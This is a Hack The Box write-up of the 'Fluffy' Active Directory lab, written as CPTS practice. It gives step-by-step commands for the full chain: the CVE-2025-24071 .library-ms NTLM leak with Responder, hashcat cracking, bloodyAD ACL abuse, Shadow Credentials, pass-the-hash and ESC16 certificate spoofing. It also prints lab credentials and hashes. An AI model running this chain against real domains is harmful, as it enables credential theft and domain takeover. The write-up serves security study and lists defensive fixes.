# Fluffy — Hack The Box (CPTS practice)

**Platform:** Hack The Box
**Difficulty:** 🟢 Easy
**OS:** Windows (Active Directory)
**Certification:** Extra practice for the CPTS (Certified Penetration Testing Specialist)
**Date completed:** 2026
**Techniques:** Nmap · SMB enumeration with given credentials · **CVE-2025-24071** (NTLM hash leak via `.library-ms`) · Responder · Hashcat (NetNTLMv2) · Active Directory ACL abuse (`bloodyAD`) · **Shadow Credentials** (`certipy-ad shadow auto`) · Pass-the-hash with Evil-WinRM · **ESC16** (ADCS) · UPN manipulation → Administrator
**Language:** English — [🇪🇸 Versión en español](./Fluffy_Writeup_ES.md)

---

## Table of contents
1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration](#2-enumeration)
3. [Initial access — CVE-2025-24071 and hash capture](#3-initial-access--cve-2025-24071-and-hash-capture)
4. [Getting a shell — ACL abuse and Shadow Credentials](#4-getting-a-shell--acl-abuse-and-shadow-credentials)
   - [Privilege escalation — ESC16](#privilege-escalation--esc16)
5. [Post-exploitation and flags](#5-post-exploitation-and-flags)
6. [Lessons learned](#6-lessons-learned)
7. [Tool & command glossary](#7-tool--command-glossary)

---

## 1. Reconnaissance

```bash
ping -c 1 10.129.72.203
```

> 🛠️ **`ping`** — checks host availability via ICMP. A TTL of **127** → **Windows**.

![](Imagenes/01-ping.png)

Full TCP port scan:

```bash
nmap -sS -Pn -vvv --min-rate 5000 --open -n -p- -oN AllPorts 10.129.72.203
```

> 🛠️ **`nmap -sS -Pn -vvv --min-rate 5000 --open -n -p-`** — a full SYN scan of all 65535 ports. `-sS` (stealthy, never completes the handshake), `-Pn` (ignore ping status), `--min-rate 5000` (speeds up sending), `--open` (only open ports), `-n` (no DNS resolution).

![](Imagenes/02-nmap-allports.png)

```bash
enum-nmap AllPorts
```

> 🛠️ **`enum-nmap`** — a custom script that summarizes Nmap's output: IP, TTL, estimated OS, and a port list ready for the next `-p`.

![](Imagenes/03-enum-nmap-herramienta-propia.png)

> 💡 19 open ports, including **53 (DNS), 88 (Kerberos), 389/636 (LDAP/LDAPS), 445 (SMB), 3268/3269 (Global Catalog), 5985 (WinRM), and 9389 (ADWS)** — the classic service set of an **Active Directory domain controller**.

Version and default-script scan against the ports found:

```bash
nmap -sS -Pn -sCV -T5 -n -p53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49689,49690,49699,49704,49714,49734 -oN Ports 10.129.72.203
```

> 🛠️ **`-sCV`** combines `-sC` (Nmap's default scripts) with `-sV` (service version detection); together with the LDAPS TLS certificates, it reveals the domain and DC name with no further enumeration needed.

![](Imagenes/04-nmap-version-servicios-dc.png)

```
Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
```

> 💡 Domain **`fluffy.htb`**, domain controller **`DC01`**. As is common in HTB/CPTS "assumed breach" AD labs, the box starts with a domain user's credentials already provided: **`j.fleischman` / `J0elTHEM4n1990!`**.

## 2. Enumeration

We add the domain resolution to the local hosts file:

```bash
echo "10.129.72.203 DC01.fluffy.htb fluffy.htb" >> /etc/hosts
```

> 🛠️ **`/etc/hosts`** — manual name resolution, essential in AD pentests: Kerberos and many tools (`bloodyAD`, `certipy-ad`, `evil-winrm`) rely on resolving the domain's/DC's FQDN, not just its IP.

![](Imagenes/05-etc-hosts.png)

We enumerate the SMB shares with `j.fleischman`'s credentials:

```bash
smbclient -L //10.129.72.203/ -U j.fleischman
```

> 🛠️ **`smbclient -L`** — lists (`-L`) the shares available on an SMB host with the given credentials (`-U`). The standard first step of authenticated SMB enumeration.

![](Imagenes/06-smbclient-list-shares.png)

```
ADMIN$   Disk   Remote Admin
C$       Disk   Default share
IPC$     IPC    Remote IPC
IT       Disk
NETLOGON Disk   Logon server share
SYSVOL   Disk   Logon server share
```

Beyond the administrative/default shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`), the custom **`IT`** share stands out. We connect:

```bash
smbclient //10.129.72.203/IT -U j.fleischman
smb: \> ls
smb: \> get Everything-1.4.1.1026.x64.zip
smb: \> get KeePass-2.58.zip
smb: \> get Upgrade_Notice.pdf
```

> 🛠️ **`get`** (inside the `smbclient` session) — downloads a remote file to the current local directory.

![](Imagenes/07-smbclient-it-share-listado-descarga.png)

We open the downloaded PDF:

![](Imagenes/08-open-upgrade-notice-pdf.png)

![](Imagenes/09-upgrade-notice-pdf-tabla-cves.png)

> 💡 The document is an internal patching notice ("Mandatory Timeslot Booking for Critical Updates") aimed at the IT department, listing pending vulnerabilities: `CVE-2025-24996` (Critical), **`CVE-2025-24071` (Critical)**, `CVE-2025-46785` (High), `CVE-2025-29968` (High), `CVE-2025-21193` (Medium), and `CVE-2025-3445` (Low). `CVE-2025-24071` is the way in: an NTLM hash leak triggered by **extracting** a ZIP containing a malicious `.library-ms` file, with no need to open anything.

## 3. Initial access — CVE-2025-24071 and hash capture

### What is CVE-2025-24071, and why does it work?

A **`.library-ms`** file defines a Windows Explorer "library" (a virtual view grouping folders together, like the Documents or Pictures libraries). Its internal XML can declare a network path (`<url>\\IP\share</url>`) as one of the grouped locations.

The flaw (CVE-2025-24071, later renamed by Microsoft to **CVE-2025-24054**) lies in **when** Windows Explorer tries to resolve that path: there's no need to open the `.library-ms` file or double-click it. **Simply extracting it from a `.zip`/`.rar` is enough** — when Explorer indexes/displays it in the destination folder, it automatically fires an SMB connection to the network path declared inside the file.

That SMB connection, like any other Windows initiates transparently, **authenticates automatically with the active session's credentials** via NTLM. If the "network share" on the other end is actually a fake SMB server (Responder), it captures the full authentication exchange: username, domain, and a crackable **NTLMv2** hash — all without the victim doing anything beyond extracting the ZIP.

```bash
git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
```

> 🛠️ **`0x6rss`'s PoC** — automatically generates a malicious `.library-ms` pointing at the given IP, packaged inside a ready-to-distribute `.zip`.

![](Imagenes/10-git-clone-cve-2025-24071-poc.png)

![](Imagenes/11-cve-2025-24071-poc-readme.png)

We generate the malicious ZIP:

```bash
python3 poc.py
Enter your file name: arabot
Enter IP (EX: 192.168.1.162): 10.10.15.31
```

> 🛠️ **`poc.py`** — asks for a decoy filename and the attacker IP, and produces `exploit.zip` with the malicious `.library-ms` pointing at `\\10.10.15.31\...`.

![](Imagenes/12-poc-py-ejecucion-exploit-zip.png)

### Setting up the capture with Responder

```bash
sudo responder -I tun0
```

> 🛠️ **Responder** — simulates network services (SMB, LLMNR, NBT-NS...) and captures any NTLM authentication attempt directed at them, with no prior credentials needed. It's the "server" that receives the connection triggered by the malicious `.library-ms`. `-I tun0` sets the HTB VPN interface as the listening point.

![](Imagenes/13-responder-listen-tun0.png)

We upload the ZIP to the `IT` share, where we already confirmed write access:

```bash
smbclient //10.129.72.203/IT -U j.fleischman
smb: \> put exploit.zip
```

![](Imagenes/14-smbclient-put-exploit-zip.png)

As soon as IT staff review/extract the uploaded file, Windows fires the SMB connection toward our IP, and Responder captures **another domain user's** authentication:

![](Imagenes/15-responder-hash-ntlmv2-p-agila.png)

```
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:...
```

### Cracking the captured hash

```bash
hashid -m "<hash>"
```

> 🛠️ **`hashid`** — identifies the hash type and, with `-m`, directly gives the corresponding hashcat mode (here, **5600** = NetNTLMv2).

![](Imagenes/16-hashid-netntlmv2.png)

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

> 🛠️ **`hashcat -m 5600`** — a dictionary attack against a NetNTLMv2 hash using `rockyou.txt`, the most common leaked-password wordlist in CTFs/pentests.

![](Imagenes/17-hashcat-m5600-rockyou.png)
![](Imagenes/18-hashcat-hash-crackeado-prometheusx.png)

```
p.agila:prometheusx-303
```

## 4. Getting a shell — ACL abuse and Shadow Credentials

With valid domain credentials (`p.agila`), we enumerate its group membership with `bloodyAD`:

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.72.203 get object "p.agila" --attr memberOf
```

> 🛠️ **`bloodyAD`** — an Active Directory enumeration and abuse tool over LDAP, designed to run from Linux without joining the domain. `get object <object> --attr <attribute>` queries a specific LDAP attribute of an object.

![](Imagenes/19-bloodyad-p-agila-memberof.png)

`p.agila` belongs to the **`Service Account Managers`** group. We check who else is a member:

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.72.203 get object "service account managers" --attr member
```

![](Imagenes/20-bloodyad-service-account-managers-member.png)

### What do the ACL permissions we found actually mean?

We check which directory objects our user can **write** to — i.e., where it holds access control entries (ACEs) granting write permissions over other objects:

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.72.203 get writable
```

> 🛠️ **`get writable`** — walks the DACL (Discretionary Access Control List) of domain objects and lists those the authenticated user holds some write right over, useful for spotting AD ACL-abuse escalation paths without relying on a graphical tool like BloodHound.

![](Imagenes/21-bloodyad-get-writable-service-accounts.png)

```
CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

> 💡 **`OWNER: WRITE`** and **`DACL: WRITE`** over the `Service Accounts` group mean `p.agila` can **modify that group's own access control list** — and therefore grant itself (or any other principal) any permission over it, including membership. This is a classic ACL abuse case: an explicit `GenericAll` isn't required if you already control who controls the permissions.

We add ourselves to the group:

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.72.203 add groupMember 'service accounts' p.agila
```

> 🛠️ **`add groupMember <group> <user>`** — adds a principal as a member of an AD group, provided the authenticated user has sufficient permissions (here, inherited from controlling the group's own DACL).

![](Imagenes/22-bloodyad-add-groupmember-service-accounts.png)

We re-run the writable-objects query. Membership in `Service Accounts` now gives us direct write access over two accounts:

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.72.203 get writable
```

![](Imagenes/23-bloodyad-get-writable-ca-svc-winrm-svc.png)

```
certificate authority service   WRITE
winrm service                   WRITE
```

These two accounts correspond to sAMAccountNames `ca_svc` and `winrm_svc` — names that already hint at their role: a Certificate Authority (ADCS) service account and an account with WinRM connection rights.

Before interacting with Kerberos/certificates, we sync the clock with the DC (Kerberos tolerates very little clock skew):

```bash
sudo net time set -S 10.129.72.203
```

> 🛠️ **`net time set -S <DC>`** — syncs the local system clock with the given server's. A skew of more than 5 minutes (default) invalidates Kerberos tickets.

![](Imagenes/24-net-time-set.png)

### What are Shadow Credentials, and why do they work?

**Shadow Credentials** is a technique that abuses an AD object's `msDS-KeyCredentialLink` attribute (introduced to support **Windows Hello for Business** and public-key/certificate-based authentication). If an attacker has write permission over that attribute on a victim account (as here, inherited from `Service Accounts` membership), they can:

1. Generate their own key pair and certificate.
2. Link that certificate's public key to the victim account's `msDS-KeyCredentialLink` — **without ever touching or knowing its current password**.
3. Authenticate as that account using **PKINIT** (certificate-based Kerberos authentication) with their own private key, obtaining a TGT.
4. Request the account's NT hash from the KDC via the protocol's **U2U (User-to-User)** extension — the TGT just obtained serves as proof of identity for that request.

The net result is equivalent to a password reset, but **completely silent**: the victim account's original password never changes, there's no account lockout or notification, and the added credential can even be reverted afterward.

```bash
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
```

> 🛠️ **`certipy-ad shadow auto -account <account>`** — automates the 4 steps above: generates the certificate, links it as a Key Credential, obtains the TGT via PKINIT, and retrieves the NT hash via U2U, all in one command.

![](Imagenes/25-certipy-shadow-auto-winrm-svc.png)
![](Imagenes/26-certipy-shadow-auto-ca-svc.png)

```
NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
NT hash for 'ca_svc'   : ca0f4f9e9eb8a092addf53bb03fc98c8
```

### Pass-the-hash and the first flag

With `winrm_svc`'s NT hash (an account implicitly tied to WinRM logon rights, as its name suggests), we authenticate directly without needing the cleartext password:

```bash
evil-winrm -i 10.129.72.203 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
```

> 🛠️ **Pass-the-hash (PtH)** — Windows' NTLM protocol authenticates with the **NT hash**, not the cleartext password. That means knowing the hash alone is enough to authenticate as that account, with no need to crack it. `evil-winrm -H` accepts the hash directly in place of `-p` (password).

![](Imagenes/27-evil-winrm-pth-winrm-svc.png)

```
cd Desktop
dir
```

![](Imagenes/28-dir-desktop-user-txt.png)

`user.txt` (34 bytes) confirmed on `winrm_svc`'s desktop — first flag.

## Privilege escalation — ESC16

With `ca_svc`'s hash (the Certificate Authority's own service account), we search the ADCS environment for vulnerable templates and configurations:

```bash
certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.72.203 -vulnerable -enabled -stdout
```

> 🛠️ **`certipy-ad find -vulnerable`** — enumerates the domain's CAs and certificate templates and checks them against the known catalog of ADCS vulnerabilities (ESC1 through ESC16), flagging which ones are exploitable with the given account's permissions.

![](Imagenes/29-certipy-find-esc16-ca-svc.png)

```
CA Name              : fluffy-DC01-CA
Disabled Extensions  : 1.3.6.1.4.1.311.25.2
[!] Vulnerabilities
  ESC16              : Security Extension is disabled.
```

### What is ESC16, and why does it work?

When a certificate is used to authenticate via Kerberos (PKINIT), the domain controller needs to decide **which AD account** that certificate maps to. The `szOID_NTDS_CA_SECURITY_EXT` extension (OID `1.3.6.1.4.1.311.25.2`) is the mechanism designed for that: it embeds the requester's **SID** inside the issued certificate itself, so the DC can verify the certificate is only valid for authenticating as that specific SID — even if the certificate also carries other identifiers (like a UPN) that could point to a different account.

**ESC16** is precisely that security extension being **disabled at the CA level** (as shown here, under `Disabled Extensions`) — not on a single template, but globally for every certificate the CA issues. Without the embedded SID as the real anchor of identity, the DC falls back to a weaker check: it authenticates the requester as whichever account's **UPN matches** the certificate's. That turns the attack trivial for any account that can:

1. Change its own **UPN** to that of a privileged account (here, `administrator`) — something any account with self-write permission on its `userPrincipalName` attribute can do.
2. Request a certificate valid for authentication (the `User` template, enabled by default for any domain user) — the certificate inherits that spoofed UPN.
3. Restore the original UPN (to avoid breaking the account's normal operation or leaving an obvious trace).
4. Authenticate with the certificate: unable to verify the real SID, the DC trusts the certificate's UPN and issues a ticket **as if it were the privileged account** — Administrator, in this case.

```bash
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'
```

> 🛠️ **`certipy-ad account update -upn`** — modifies the given account's `userPrincipalName` attribute via LDAP. Here we change `ca_svc`'s (which we control) UPN to match `administrator`'s.

![](Imagenes/30-certipy-account-update-upn-administrator.png)

```bash
certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.72.203 -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
```

> 🛠️ **`certipy-ad req -template User`** — requests a certificate from the given CA using the default `User` template (enabled for any authenticated user), authenticating as `ca_svc` via pass-the-hash. The resulting certificate carries `ca_svc`'s current UPN, which at this point is `administrator`.

![](Imagenes/31-certipy-req-template-user-administrator-pfx.png)

```
Got certificate with UPN 'administrator'
Saving certificate and private key to 'administrator.pfx'
```

We restore `ca_svc`'s original UPN — the already-issued certificate keeps the spoofed UPN regardless, so this restoration doesn't undo the attack, it just avoids leaving the account in an inconsistent state:

```bash
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'
```

![](Imagenes/32-certipy-account-update-upn-restaurado.png)

We authenticate with the `administrator.pfx` certificate against Kerberos via PKINIT:

```bash
certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.72.203
```

> 🛠️ **`certipy-ad auth -pfx`** — performs PKINIT authentication with the given certificate, obtains a TGT, and additionally retrieves the authenticated account's NT hash via U2U — Administrator's, in this case, thanks to ESC16.

![](Imagenes/33-certipy-auth-pfx-hash-administrator.png)

```
Certificate identities:
    SAN UPN: 'administrator'
```

> 🔒 The real Administrator NT hash recovered at this step isn't published in this writeup on purpose, so anyone practicing this same box still has to complete that step themselves — the exact command and mechanism to obtain it are documented above.

Final pass-the-hash with Evil-WinRM, using Administrator's recovered hash:

```bash
evil-winrm -u 'Administrator' -H '<Administrator NT hash>' -i dc01.fluffy.htb
```

![](Imagenes/34-evil-winrm-pth-administrator.png)

## 5. Post-exploitation and flags

```
cd C:\Users\Administrator\Desktop
dir
```

![](Imagenes/35-dir-desktop-root-txt.png)

`root.txt` (34 bytes) confirmed on Administrator's desktop — full domain controller compromise.

> 🔒 The exact contents of `user.txt` and `root.txt` aren't published in this writeup on purpose, so anyone practicing this same box still has to complete that last step themselves — the full path to each one is documented in §4 and §5.

## 6. Lessons learned

| Vulnerability | Where | Impact |
|----------------|-------|---------|
| SMB `IT` share writable by a standard domain user | `IT` share | Allows uploading a malicious file that IT staff will process |
| **CVE-2025-24071** (NTLM leak via `.library-ms` on ZIP extraction) | Processing of the uploaded file | Captures another domain user's credentials with no direct victim interaction |
| Weak password, present in `rockyou.txt` | `p.agila` account | Authenticated domain access after cracking the NTLMv2 hash |
| `OWNER`/`DACL: WRITE` over an AD group assigned to a low-privilege account | `Service Accounts` group | Self-adds to the group and inherits its write permissions over service accounts |
| Write access over `msDS-KeyCredentialLink` of service accounts (Shadow Credentials abuse) | `ca_svc`, `winrm_svc` | Extracts NT hashes without knowing or resetting passwords |
| **ESC16**: security extension disabled on the CA | `fluffy-DC01-CA` (ADCS) | A certificate with an arbitrary UPN authenticates as the matching principal — direct escalation to Administrator |

## Defensive recommendations

- Restrict SMB share write permissions to the bare minimum; never expose an IT share with write access to standard user accounts.
- Apply the CVE-2025-24071/CVE-2025-24054 patch and treat any archive received from untrusted sources with caution.
- Enforce strong passwords and rotation policies across all domain accounts, service accounts included.
- Periodically audit AD group ACLs: no group with elevated permissions should have `OWNER`/`WRITE` in the hands of a low-privilege account.
- Monitor changes to the `msDS-KeyCredentialLink` attribute on sensitive accounts — the direct indicator of a Shadow Credentials attack.
- Keep the security extension (`szOID_NTDS_CA_SECURITY_EXT`) enabled on all CAs and certificate templates to prevent ESC16.
- Restrict which accounts can request certificates using templates that enable authentication (such as `User`), and monitor unexpected changes to the `userPrincipalName` attribute on accounts with certificate-request privileges.

## 7. Tool & command glossary

| Tool / command | What it's for |
|------------------|-----------------|
| `ping` / `nmap` | Host discovery and port/service enumeration |
| `enum-nmap` | Custom script that summarizes Nmap's output |
| `/etc/hosts` | Manual name resolution, essential for Kerberos and AD tooling |
| `smbclient -L` / `get` / `put` | Enumerate SMB shares, and download/upload files within a session |
| **`.library-ms`** | A Windows Explorer library file; can declare a network path Explorer resolves automatically when extracted from a ZIP/RAR (CVE-2025-24071) |
| **Responder** | Simulates network services (SMB, LLMNR, NBT-NS) to capture NTLM authentication exchanges |
| `hashid` | Identifies a hash's type and its corresponding hashcat mode |
| `hashcat -m 5600` | Dictionary attack against NetNTLMv2 hashes |
| **`bloodyAD`** | Active Directory enumeration and abuse over LDAP from Linux (reading/writing attributes, groups, ACLs) |
| `get writable` (bloodyAD) | Lists the AD objects the authenticated user has write permissions over |
| `add groupMember` (bloodyAD) | Adds a principal as a member of an AD group |
| **ACL abuse / `OWNER`+`DACL: WRITE`** | Controlling an object's access control list lets you grant yourself any permission over it, with no explicit `GenericAll` needed |
| `net time set -S` | Syncs the local clock with the DC — required for Kerberos to accept tickets |
| **Shadow Credentials** (`certipy-ad shadow auto`) | Abuses `msDS-KeyCredentialLink` to link your own certificate to a victim account and extract its NT hash via PKINIT + U2U, without touching its password |
| **Pass-the-hash (PtH)** | Authenticating with the NT hash directly, no need for the cleartext password or to crack it |
| `evil-winrm -H` | A WinRM client that accepts NT-hash authentication (pass-the-hash) in place of a password |
| **ADCS / `certipy-ad find -vulnerable`** | Enumerates Certificate Authorities and templates, flagging known vulnerabilities (ESC1–ESC16) |
| **ESC16** | The `szOID_NTDS_CA_SECURITY_EXT` security extension disabled on the CA; the DC authenticates certificates by UPN instead of the embedded SID, allowing impersonation of any account by changing your own UPN before requesting the certificate |
| `certipy-ad account update -upn` | Modifies a controlled account's `userPrincipalName` via LDAP |
| `certipy-ad req -template User` | Requests a certificate from a CA using a specific template |
| `certipy-ad auth -pfx` | PKINIT authentication with a certificate; obtains a TGT and, via U2U, the authenticated account's NT hash |

---

*Written by [Arabot](https://github.com/Caan31) · Hack The Box · CPTS practice · 2026*
